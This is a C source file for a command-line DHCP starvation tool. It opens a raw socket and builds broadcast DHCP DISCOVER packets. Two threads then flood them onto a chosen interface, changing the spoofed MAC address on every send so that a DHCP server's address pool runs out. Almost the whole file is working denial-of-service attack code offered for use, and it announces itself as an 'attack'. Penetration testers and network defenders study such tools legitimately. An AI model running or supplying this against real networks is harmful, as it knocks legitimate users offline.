#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <pthread.h>
#include <signal.h>
#include "dstar.h"
#include "../lib/argsx.h"

unsigned char buff[PKTLEN];
struct eth_header *ethernet = (struct eth_header *) buff;
struct ipv4_header *ipv4 = (struct ipv4_header *) (buff + ETHHDRSIZ);
struct udp_header *udp = (struct udp_header *) (buff + ETHHDRSIZ + IPV4HDRSIZE);
struct dhcp_pkt *dhcp = (struct dhcp_pkt *) (buff + ETHHDRSIZ + IPV4HDRSIZE + UDPHDRSIZE);
// ***************************************************************************************
int sock;
struct sockaddr_ll iface;
// **********************
pthread_t th[2];
pthread_mutex_t lock;
bool stop = false;

int main(int argc, char **argv) {
    struct options opt = {false, false, false, false, 0, 0, "\0", 0};

    int ret;
    ax_lopt lopt[] = {{(char *) "help",    ARGSX_NOARG, 'h'},
                      {(char *) "version", ARGSX_NOARG, 'v'}};
    while ((ret = argsx(argc, argv, (char *) "hvm!n!x!\0", lopt, sizeof(lopt), '-')) != -1) {
        switch (ret) {
            case 'h':
                usage();
                return 0;
            case 'v':
                printf("%s V: %s\n", APPNAME, VERSION);
                return 0;
            case 'm':
                if (!parse_hwaddr(ax_arg, &opt.hwaddr)) {
                    fprintf(stderr, "Malformed mac addr!\n");
                    return -1;
                }
                opt.smac = true;
                break;
            case 'n':
                opt.num = (unsigned int) atoi(ax_arg);
                opt.snum = opt.num > 0;
                break;
            case 'x':
                opt.xid = (unsigned short int) atoi(ax_arg);
                opt.sid = true;
                break;
            case ARGSX_BAD_OPT:
                return -1;
            case ARGSX_FEW_ARGS:
                return -1;
            case ARGSX_NONOPT:
                if (!opt.sifn) {
                    if (strlen(ax_arg) >= IFNAMSIZ) {
                        fprintf(stderr, "%s name too long!\n", ax_arg);
                        return -1;
                    }
                    strcpy(opt.iface_name, ax_arg);
                    opt.sifn = true;
                }
                break;
            default:
                break;
        }
    }
    signal(SIGINT,catch_signal);
    if (opt.sifn)
        return dstar(&opt);
    usage();
    return 0;
}

int dstar(struct options *opt) {
    if (getuid()) {
        fprintf(stderr, "Required elevated privileges!\n");
        return -1;
    }
    struct dhcp_container dhcpContainer;
    struct in_addr ipaddr;
    memset(buff, 0x00, PKTLEN);
    // Open Socket
    if ((sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
    {
        fprintf(stderr,"Failed to open socket!\n");
        return -1;
    }
    // Build ETHERNET header
    memset(ethernet->dhwaddr, 0xFF, IFHWADDRLEN); // broadcast mac
    ethernet->eth_type = htons(ETH_P_IP);
    if (!opt->smac) {
        rndhwaddr(&opt->hwaddr);
    }
    memcpy(ethernet->shwaddr, opt->hwaddr.sa_data, IFHWADDRLEN);
    // Build IPv4 header
    ipv4->version = IPV4VERSION;
    ipv4->ihl = 5;
    ipv4->dscp = 0;
    ipv4->ecn = 0;
    ipv4->len = htons(PKTLEN - ETHHDRSIZ);
    ipv4->id = 0x00;
    ipv4->ttl = 64; // hops
    ipv4->protocol = IPPROTO_UDP; // UDP
    parse_ipv4addr("255.255.255.255", &ipaddr);
    ipv4->daddr = ipaddr.s_addr;
    ipv4_checksum(ipv4);

    // Build udp header
    build_udp_header(udp, 68, 67, DHCPPKTLEN);
    // Build dhcp packet
    build_dhcp_discover(&dhcpContainer, &opt->hwaddr, &ipaddr);
    dhcp_init_options(&dhcpContainer);
    memcpy(buff + PKTLEN - DHCPPKTLEN, &dhcpContainer.dhcpPkt, sizeof(struct dhcp_pkt)); // copy dhcp packet to buffer
    if(!build_sockaddr_ll(&iface, opt->iface_name, &opt->hwaddr)) {
        fprintf(stderr,"Error while getting interface index, check interface name!\n");
        close(sock);
        return -1;
    }
    // HERE
    printf("Starting DHCP_DISCOVER attack...");
    struct th_opt tho[2];
    tho[0].st=opt->snum;
    tho[1].st=opt->snum;
    tho[0].time=opt->num/2;
    tho[1].time=tho[0].time + opt->num%2;
    pthread_create(th,NULL,mk_dos,tho);
    pthread_create(th+1,NULL,mk_dos,tho+1);
    printf("\t\t[OK]\n");
    pthread_join(th[0],NULL);
    pthread_join(th[1],NULL);
    close(sock);
    return (tho[0].ret==0&&tho[1].ret==0)?0:-1;
}

void catch_signal(int signo)
{
    printf("Interrupted by user\n");
    stop=true;
}

void *mk_dos(void *options) {
    struct th_opt *opt = (struct th_opt*)options;
    while (opt->st && opt->time > 0 && !stop || !opt->st&&!stop) {
        pthread_mutex_lock(&lock);
        if(sendto(sock, buff, PKTLEN, 0, (struct sockaddr *) &iface, sizeof(struct sockaddr_ll))<0)
        {
            fprintf(stderr,"sendto error\n");
            stop = true;
            opt->ret=-1;
            break;
        }

        for (int i = 0; i < IFHWADDRLEN; i++) {
            ethernet->shwaddr[i] = ethernet->shwaddr[(i + 2) % IFHWADDRLEN] ^ ethernet->shwaddr[(i + 1) % IFHWADDRLEN];
            dhcp->chaddr[i] = ethernet->shwaddr[i];
        }
        ethernet->shwaddr[3] = ethernet->shwaddr[3] << 3;
        ethernet->shwaddr[5] = ethernet->shwaddr[5] >> 1;
        ethernet->shwaddr[0] &= ethernet->shwaddr[4] & ((char) 0xFE);
        dhcp->chaddr[3] = ethernet->shwaddr[3];
        dhcp->chaddr[5] = ethernet->shwaddr[5];
        dhcp->chaddr[0] = ethernet->shwaddr[0];
        pthread_mutex_unlock(&lock);
        if (opt->st)
            opt->time--;
    }
    opt->ret=0;
    return NULL;
}

void usage() {
    printf("\n%s V: %s\n"
                   "DHCP starvation tool.\n", APPNAME, VERSION);
    printf("Usage: %s iface [OPTIONS]\n"
                   "\t-h, --help\tPrint this help\n"
                   "\t-v, --version\tPrint version and exit\n"
                   "\t-m\t\tSet mac address\n"
                   "\t-n\t\tSet number of discover\n"
                   "\t-x\t\tSet dhcp packet ID\n", APPNAME);
}
